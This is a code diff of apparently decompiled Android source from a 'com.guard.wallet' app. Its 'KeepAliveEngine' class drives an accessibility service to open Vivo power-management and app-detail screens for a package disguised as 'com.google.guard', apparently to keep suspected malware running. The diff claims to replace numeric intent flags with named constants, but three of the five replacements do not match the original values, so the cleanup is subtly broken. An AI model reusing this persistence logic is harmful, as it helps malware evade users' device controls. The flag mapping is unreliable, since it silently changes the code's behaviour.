@@ -252,11 +252,11 @@ public final class VivoEngine extends KeepAliveEngine {
                         "com.iqoo.powersaving.fuelgauge.PowerRankActivity");
                 Intent intent = new Intent();
                 intent.setComponent(cn);
-                intent.addFlags(268435456);
-                intent.addFlags(536870912);
-                intent.addFlags(67108864);
-                intent.addFlags(2097152);
-                intent.addFlags(8388608);
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                intent.addFlags(Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);
+                intent.addFlags(Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
+                intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
+                intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                 this.s.set("prepareInAppPowerRank");
                 com.guard.wallet.utils.SystemHelper.Z().startActivity(intent);
                 Log.d("o.i0", "已启动耗电管理");
@@ -550,7 +550,6 @@ public final class VivoEngine extends KeepAliveEngine {
                     stateRef.set("prepareInAppDetailSetting");
                     com.guard.wallet.utils.SystemHelper.Z0(MyAccessibilityService.P().getPackageName());
                     Log.d("o.i0", MyAccessibilityService.P().getPackageName().concat(" 应用详情已启动"));
-                    MyAccessibilityService.P().getPackageName().concat(" 应用详情已启动");
                     return;
                 }
                 if (!com.guard.wallet.utils.SharedPrefsManager.r("com.google.guard")
@@ -559,7 +558,6 @@ public final class VivoEngine extends KeepAliveEngine {
                     stateRef.set("prepareInAppDetailSetting");
                     com.guard.wallet.utils.SystemHelper.Z0("com.google.guard");
                     Log.d("o.i0", "com.google.guard".concat(" 应用详情已启动"));
-                    "com.google.guard".concat(" 应用详情已启动");
                     return;
                 }
             }
@@ -571,7 +569,6 @@ public final class VivoEngine extends KeepAliveEngine {
                 stateRef.set("prepareInAppDetailSetting");
                 com.guard.wallet.utils.SystemHelper.Z0("com.google.guard");
                 Log.d("o.i0", "com.google.guard".concat(" 应用详情已启动"));
-                "com.google.guard".concat(" 应用详情已启动");
                 return;
             }
 
